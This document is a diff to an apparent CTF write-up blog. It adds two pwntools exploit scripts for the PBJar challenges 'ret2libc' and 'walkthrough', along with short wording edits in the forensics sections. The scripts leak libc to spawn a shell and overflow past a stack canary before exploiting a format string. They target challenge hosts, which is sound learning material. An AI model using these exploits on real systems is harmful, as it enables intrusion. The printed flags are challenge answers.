@@ -256,7 +256,64 @@ miner's address. Sure enough, the transfer value was the "bribe" and the flag.
 >
 >Created By: Rythm
 
+The first pwn challenge, ret2libc, is a great tutorial challenge for anyone wanting
+to learn how perform a ret2libc exploit. I really recommend trying it out if you want
+to learn this technique. You can find the binary [here](/assets/pbjar/ret2libc) and the C code here [here](/assets/pbjar/ret2libc.c).
 
+```python
+from pwn import *
+
+ip = '143.198.127.103'
+port = 42001
+
+p = connect(ip, port)
+
+
+binary = ELF('./ret2libc')
+context.binary = binary
+rop = ROP(binary)
+libc = ELF('./libc-2.31.so')
+
+
+rop.raw('a'*40)
+rop.puts(binary.got.puts)
+rop.call(binary.entry)
+print(rop.dump())
+
+p.recvuntil(b'would you like to learn about ret2libc?[y/N]')
+
+p.sendline(rop.chain())
+p.recvuntil(b'I see, you must be a natural!\n')
+p.recvline()
+leaked_puts = p.recvline()[:8].strip()
+print("Leaked puts@GLIBC: {}".format(leaked_puts))
+
+leaked_puts = int.from_bytes(leaked_puts, byteorder='little')
+libc.address = leaked_puts - libc.symbols.puts
+
+rop2 = ROP(libc)
+rop2.raw("a"*40)
+rop2.call(rop.ret)
+rop2.system(next(libc.search(b'/bin/sh\0')))
+
+
+p.recvuntil(b'would you like to learn about ret2libc?[y/N]')
+p.sendline(rop2.chain())
+
+
+p.interactive()
+```
+
+I can't do nearly enough justice describing this as the tutorial. But the basic idea
+here is to first leak libc addresses and then use them to invoke libc functions.
+We usually end up invoking something like "system('/bin/sh')" in order to read the flag.
+Here are the results of my solution and the resulting flag.
+
+![Ret2libc Script Results](/assets/pbjar/ret1.png)
+
+>flag{th3_wh0l3_us3l3r4nd_1s_my_pl4ygr0und} 
+
+&nbsp;
 
 ### **Walkthrough**
 
@@ -269,6 +326,45 @@ miner's address. Sure enough, the transfer value was the "bribe" and the flag.
 >Connect with "nc 147.182.172.217 42001".
 >
 >Created By: Rythm
+
+Walkthrough is a nice intro challenge to format strings and canary bypassing.
+Much like ret2libc, walkthrough provides a well explained tutorial with a bunch
+of hints (and some code) to help with the process of learning pwn challenges.
+I definitely recommend checking it out for yourself if you want to learn these themes.
+The binary can be found [here](/assets/pbjar/walkthrough) and the full C code [here](/assets/pbjar/walkthrough.c).   
+
+```python
+from pwn import *
+e = ELF('./walkthrough')
+p = connect('147.182.172.217', 42001)
+p.recvuntil('later): ')
+canary = int(p.recvline(keepends = False), 16) #keepends = False drop the newline character
+p.sendline(b'a' * 72 + p64(canary) + b'a' * 8 + p64(e.sym['fmtstr'] + 1)) #figure out what x and y values should be
+
+p.recvuntil(b'Input the string that will be passed into printf.')
+p.sendline(b'%14$llx')
+p.recvuntil(b'The printf result is:\n')
+s = p.recvline().decode().strip()
+number = int(s, 16)
+p.recvuntil(b"Now input the value you're guessing.")
+p.sendline(str(number))
+p.interactive()
+```
+
+The challenge is divided into two halves. In the first half, we need to use a buffer
+overflow and overwrite a stack canary to return to the start of part 2.
+My solution uses the provided exploit code to solve the first half of the
+challenge with a few values inserted in. The values 72 and 8  were found through
+experimentation with gdb.
+
+For part 2, we must use a format string vulnerability to print a previously randomly
+generated number from the stack. Once we input the number the flag will print out.
+
+![Code Execution](/assets/pbjar/walkthrough1.png)
+
+>flag{4nd_s0_th3_3xpl01ts_b3g1n}
+
+&nbsp;
 
 ## **Rev**
 
@@ -786,7 +882,7 @@ the flag.
 >
 >Created By: ZeroDayTea
 
-Tippy tappies is a forensics challenge where we are given a capture of some USB input.
+Tippy tappies is a forensics challenge where we are given a capture of some USB frames.
 To start, let's look at the capture in Wireshark.
 
 [![USB Captures](/assets/pbjar/tippy1.png)](/assets/pbjar/tippy1.png)
@@ -1081,7 +1177,7 @@ correlates to the frontdesk@allsafecybersec.com email address we found earlier.
 Given the lack of other emails or correspondence, it seemed like a good bet that this was either
 the phishing email or a response to it. The final line of the email points to this being
 connected to the "From" and "To" tags we saw earlier. If this is the case, then Th3_Wh1t3R0s3
-is the phisher. This means Th3_Wh1t3R0s3 should be the flag. Submitting this flag resulted in a 
+is the phisher. This means Th3_Wh1t3R0s3 should be the flag. Submitting this flag resulted in a
 victory and the challenge was complete.
 
 >flag{Th3_Wh1t3R0s3}
